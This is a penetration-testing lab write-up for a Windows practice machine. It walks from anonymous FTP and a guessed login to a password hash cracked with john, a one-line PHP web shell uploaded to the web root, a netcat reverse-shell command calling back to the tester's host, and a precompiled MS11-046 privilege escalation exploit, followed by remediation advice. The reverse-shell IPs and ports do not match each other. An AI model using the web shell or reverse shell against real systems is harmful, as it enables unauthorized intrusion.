---
Alias: Authby
Date: 6/22/22
Platform: Windows
Difficulty: Intermediate
Tags: #simplephpbackdoorRCE #MS11-046 #.htaccess #rootdirectorylocationsWWW #rootdirectorylocationsHTDOCS #rootdirectorylocationsPUBLIC_HTML
Status: Finished
IP: 192.168.100.46
---

# {{Authby}}


# Resolution summary
- Gained access to an anonymous FTP server login and obtained a username
- Guessed the password for the discovered user in order to access the FTP server.
- Found the hashed password and username
- Discovered that the WordPress site's root directory contained the ftp directory.
- John was used to crack the user's hashed password.
- Accessed the login page on port 242
- Uploaded a simple PHP backdoor script to the WordPress site's root directory on the FTP server.
- Confirmed RCE
- Uploaded a netcat binary to FTP server 
- Received a command prompt 
- Found system was not patched for vulnerability MS11-046 
- After transferring the compiled MS11-046 binary onto the system and executing the exploit, a CMD executing as nt authority\system was obtained.
- 
## Improved skills
- Password guessing
- Discovered that the root directory of WordPress sites has a.htaccess file.
- Acquired knowledge (based on the hosting provider)  A folder with the name public_html, www, htdocs, or httpdocs may be the root directory.

## Used tools
- rustscan
- john

### **Initial Access Vulnerability Explanation:** 
# 1. Anonymous FTP Acccess
# 2. Writable Root Directory to a Web Server

# 1. Anonymous FTP Acccess
Title: Anonymous FTP Misconfiguration Vulnerability
Type of Vulnerability: Security Misconfiguration (OWASP Top 10: A6:2017-Security Misconfiguration)
CWE Reference: CWE-276: Incorrect Default Permissions
Proposal for CVSS Score: 5.3 (Medium)

    CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    The medium score reflects the risk that unauthorized access to files can lead to information disclosure. The impact is somewhat mitigated by the fact that compromise of integrity and availability is not directly facilitated by this vulnerability.

Generic Description:

The Anonymous FTP vulnerability arises from a misconfiguration of FTP servers that allows anonymous users to access files and directories. FTP (File Transfer Protocol) servers are used for transferring files between clients and servers on a network. When configured to allow anonymous access, users can log in with a standard username such as "anonymous" or "ftp" and, in many cases, any password or no password. While anonymous FTP can be intentionally used to provide public access to files, it becomes a vulnerability when sensitive data is inadvertently made accessible due to a misconfiguration or oversight.
Specific Description:

This vulnerability stems from either an intentional or unintentional configuration that permits users to access an FTP server anonymously, i.e., without providing a personal username and password. This can lead to unauthorized access to sensitive files or directories, information disclosure, and potentially a foothold in the network for further attacks if sensitive data or executables are accessed. The issue is exacerbated if the anonymous user is granted write access, as this can lead to the upload of malicious files, defacement, or distribution of illegal content.

# 2. Writable Root Directory to a Web Server
Title: Insecure Permissions on Web Server Root Directory
Type of Vulnerability: Security Misconfiguration (OWASP Top 10: A6:2017-Security Misconfiguration)
CWE Reference: CWE-276: Incorrect Default Permissions
Proposal for CVSS Score: 7.5 (High)

    CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    The score reflects the vulnerability's network accessibility, low attack complexity, no required privileges, and no user interaction. The impact is rated high for integrity and availability because writable root directories can lead to website defacement, deployment of malicious content, and potentially to more severe server-side attacks.

Generic Description:

A writable root directory in a web server constitutes a significant security vulnerability. This configuration flaw occurs when the root directory of the web server, which is accessible over the web, is configured with permissions that allow unauthorized users to write or modify files. This can lead to several security risks, including website defacement, the uploading of malicious web shells, data theft, and the distribution of malware to visitors of the website. The issue often arises due to misconfigurations or oversight during the setup of the web server.
Specific Description:

The vulnerability is primarily due to inadequate file permissions set on the web server’s root directory. Web servers are typically configured to serve files from a specific directory known as the root directory. When this directory is writable by users other than those administrating the server, it becomes possible for attackers to upload, modify, or delete files. This can be exploited by uploading malicious scripts or content, thereby compromising the server or its hosted applications. The exploitation of this vulnerability does not require authenticated access, making it a critical risk that needs immediate attention.

### **Initial Access Vulnerability Fix:** 

# 1. Anonymous FTP Access

1. **Review FTP Server Configuration:** Regularly review the configuration of your FTP server to ensure that anonymous access is disabled unless it is a deliberate choice for sharing non-sensitive data. Ensure that directories accessible via anonymous FTP do not contain sensitive information.
    
2. **Limit Anonymous Access:** If anonymous access must be enabled for legitimate reasons, strictly limit the directories and files that can be accessed. Never allow write access to anonymous users. Consider using directory permissions or chroot jails to restrict access.
    
3. **Use Secure Alternatives:** Where possible, use more secure alternatives to FTP, such as SFTP (SSH File Transfer Protocol) or FTPS (FTP Secure), which provide encrypted connections and better authentication mechanisms.
    
4. **Monitor Access Logs:** Regularly monitor FTP access logs for unusual or unauthorized access patterns. This can help in identifying and responding to attempts to exploit the anonymous FTP configuration.
    
5. **Educate and Train Staff:** Ensure that staff responsible for managing FTP servers are aware of the risks associated with anonymous FTP and are trained in secure configuration practices.
    
6. **Implement Network Segmentation:** Segregate FTP servers from the rest of the network as much as possible to limit the potential impact of a breach. Use firewalls and other network security tools to control access to the FTP server.
    
7. **Regular Security Audits and Penetration Testing:** Conduct regular security audits of your network, including penetration testing, to identify and rectify potential vulnerabilities like anonymous FTP misconfigurations.
    

By implementing these remediation steps, organizations can significantly mitigate the risks associated with anonymous FTP configurations and enhance their security posture against unauthorized access and information disclosure.

# 2. Writable Root Directory to a Web Server
1. **Review and Restrict Directory Permissions:** Examine the permissions set on the web server’s root directory and ensure that they are restricted to read-only for unauthorized users. Only administrative accounts or specific service accounts required for the operation of legitimate web applications should have write permissions.
    
2. **Implement Proper Access Controls:** Use access control mechanisms to define who can modify the content within the web server’s directories. This should be tightly controlled and monitored.
    
3. **Use a Web Application Firewall (WAF):** Deploy a Web Application Firewall to detect and block attempts to exploit web vulnerabilities, including unauthorized attempts to upload or modify files.
    
4. **Regular Security Audits:** Conduct regular security audits of your web server configurations and permissions to ensure that no insecure permissions are granted due to oversight or configuration changes.
    
5. **Separation of Environments:** Separate development, testing, and production environments and ensure that only necessary files are present in the production environment. This minimizes the risk of accidental exposure of writable directories.
    
6. **Disable Unnecessary Services:** Disable any services or features of the web server that are not required for its operation. This reduces the potential attack surface.
    
7. **File Upload Security:** If your application requires users to upload files, ensure that uploads are handled securely. This includes validating file types, scanning for malware, and storing files in a location outside the web root when possible.
    
8. **Regular Backups and Monitoring:** Maintain regular backups of the web server and hosted content. Implement monitoring to detect unauthorized changes to the website’s files and directories.
    
9. **Educate Developers and Administrators:** Ensure that developers and administrators are aware of the risks associated with writable web directories and train them in secure configuration practices.
    

By addressing this vulnerability with a comprehensive remediation plan, organizations can significantly enhance the security of their web servers and protect against a range of web-based attacks.

### **Privilege Escalation Vulnerability Explanation:** 

#### Title: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege

#### Type of Vulnerability: Elevation of Privilege (EoP)

#### CWE Reference: CWE-269: Improper Privilege Management

#### Proposal for CVSS Score: 7.2 (High)

- **CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H**
- This score is based on the vulnerability being locally exploitable, requiring prior access to the target system (low attack complexity and privilege level), and no user interaction. It leads to a high impact on confidentiality, integrity, and availability due to elevation of privilege.

#### Generic Description:

The MS11-046 vulnerability pertains to a flaw in the Windows Ancillary Function Driver (AFD), which is a part of the Windows operating system kernel that provides support for Windows Sockets applications to perform various network operations. This vulnerability allows an authenticated local user to elevate their privileges on a Windows system. Successful exploitation of this vulnerability could allow an attacker to execute code with elevated privileges, enabling full control over the affected system. This issue is due to improper management of objects in memory by the AFD, which could be exploited via a specially crafted application.

#### Specific Description:

This elevation of privilege vulnerability is caused by the Ancillary Function Driver (AFD) improperly validating input passed from user mode to the kernel. Attackers who successfully exploit this vulnerability could run arbitrary code in kernel mode. Running code in kernel mode could then allow the attacker to install programs; view, change, or delete data; or create new accounts with full user rights. Attackers would need to have valid login credentials and be able to log on locally to exploit this vulnerability, making it an elevation of privilege vulnerability, as it cannot be exploited remotely or by anonymous users.

### **Privilege Escalation Vulnerability Fix:** 

1. **Apply Microsoft Patch:** Microsoft has addressed this vulnerability in their MS11-046 security bulletin. The primary remediation is to apply the update provided by Microsoft for affected systems. This patch fixes the vulnerability by correcting the way that the Ancillary Function Driver (AFD) validates input passed from user mode.
    
2. **Principle of Least Privilege:** Ensure that all user accounts operate under the principle of least privilege, meaning they have only the permissions necessary for their roles. This can mitigate the impact of this vulnerability by limiting what an attacker can do if they manage to exploit this flaw.
    
3. **Security Awareness Training:** Users should be trained to avoid practices that could lead to malware infection or unauthorized access, as the exploitation of this vulnerability requires local access. Awareness about phishing, malicious software, and social engineering is key.
    
4. **Regular System and Software Updates:** Regularly update all systems and software, not just the operating system, to protect against vulnerabilities. Use automated update mechanisms where available.
    
5. **Access Control Measures:** Implement strong access control measures, including the use of strong passwords, multi-factor authentication (MFA), and account lockout policies to prevent unauthorized access to systems.
    
6. **Monitoring and Logging:** Enhance system monitoring to detect unusual behavior that might indicate an exploitation attempt. Ensure that logs are maintained and regularly reviewed for signs of unauthorized or anomalous activities.
    
7. **Incident Response Plan:** Have an incident response plan in place that includes procedures for responding to a system compromise, including elevation of privilege exploits. This should involve initial containment, eradication of the threat, recovery steps, and a post-mortem analysis to prevent future occurrences.
    

By following these remediation steps, organizations can protect themselves against the MS11-046 vulnerability and improve their overall security posture against similar elevation of privilege threats.



---

# Information Gathering
Scanned all TCP ports:
```bash
ustscan -a 192.168.100.46 --ulimit 5000                                                                                       (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.100.46:21
Open 192.168.100.46:242
Open 192.168.100.46:3145
Open 192.168.100.46:3389
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 14:38 EDT
Initiating Ping Scan at 14:38
Scanning 192.168.100.46 [2 ports]
Completed Ping Scan at 14:38, 3.00s elapsed (1 total hosts)
Nmap scan report for 192.168.100.46 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds


sudo nmap -sC -sV -O 192.168.100.46 -p 21,242,3145,3389                                                                        (master✱) 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 17:55 EDT
Nmap scan report for 192.168.100.46
Host is up (0.080s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jun 17 01:38 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Sep 22  2021 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2022-06-16T21:56:29+00:00
|_ssl-date: 2022-06-16T21:56:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2022-06-15T12:28:44
|_Not valid after:  2022-12-15T12:28:44
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.24 seconds

```

Enumerated open TCP ports:
```bash
21
242
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 21

- Next, we focus on gaining access to the FTP server. We are able to log in anonymously and retrieve username admin.

![](Images/Pasted%20image%2020221001114759.png)

- Next, we guess the user admin password and use the following credentials to access the user's FTP server:
  
username: admin
password: admin

![](Images/Pasted%20image%2020221001114845.png)

- We locate the hashed password for offsec and the username offsec in file .htpasswd after downloading the discovered files to our Kali machine.

![](Images/Pasted%20image%2020221001114935.png)

- The FTP directory is located in the WordPress site's root directory, as indicated by the.htaccess file.

![](Images/Pasted%20image%2020221001115013.png)

![](Images/Pasted%20image%2020221001115038.png)

- The password "elite" was obtained when we used "john hash.txt - wordlist=/usr/share/wordlists/rockyou.txt" to crack the hash:

![](Images/Pasted%20image%2020221001115111.png)

## Port 242

- Next, we use the obtained credentials below to access the login page on "http://192.168.100.46:242":

username: offsec
password: elite

![](Images/Pasted%20image%2020221001115137.png)

![](Images/Pasted%20image%2020221001115213.png)


---

# Exploitation
## Simple PHP Backdoor RCE

## Port 21

- As per our earlier discoveries, the root directory contains the.htaccess file.

- On our Kali machine, we create a file called "simplephpbackdoor.php" that contains the following:

<?php system($_GET["cmd"]);?>

- Subsequently, we access the admin FTP server and upload the file simplephpbackdoor.php.

![](Images/Pasted%20image%2020221001115235.png)

## Port 242

- After that, we confirm remote code execution (RCE) by visiting the URL below:

![](Images/Pasted%20image%2020221001115307.png)

#simplephpbackdoorRCE

- We transfer a netcat binary to the FTP server.

- We launch a netcat listener on our Kali machine at port 3145.

- The reverse shell is then executed by visiting the following URL, which gives us a shell.

[http://192.168.69.46:242/simplephpbackdoor.php?cmd=](http://192.168.69.46:242/simplephpbackdoor.php?cmd=dir)nc 192.18.69.127 9090 -e cmd

![](Images/Pasted%20image%2020221001115406.png)


---

# Privilege Escalation
## Local Enumeration

- Entering “systeminfo” revealed that Windows Server 2008 was being used on the computer, and no hot fixes or updates were present:

```
Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          6/22/2022, 2:20:04 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,659 MB
Page File: Max Size:       1,983 MB
Page File: Available:      1,542 MB
Page File: In Use:         441 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A
```
#KernalExploitPrivilegeEscalation

- Searching for "6.0.6001 Service Pack 1 Build 6001 exploit" on Google brought to the webpage that included exploit MS11-046:

![](Images/Pasted%20image%2020221001115431.png)

![](Images/Pasted%20image%2020221001115452.png)

- We search for the exploit on Google and download the precompiled version listed below to our Kali machine.

![](Images/Pasted%20image%2020221001115515.png)

![](Images/Pasted%20image%2020221001115534.png)

## Privilege Escalation vector
## MS11-046

- We then transferred the compiled MS11–046 binary onto the target system

- A command prompt executing as nt authority\system appeared when we typed “ms11–046.exe”:

![](Images/Pasted%20image%2020221001115612.png)
![](../Images/Pasted%20image%2020220622221842.png)
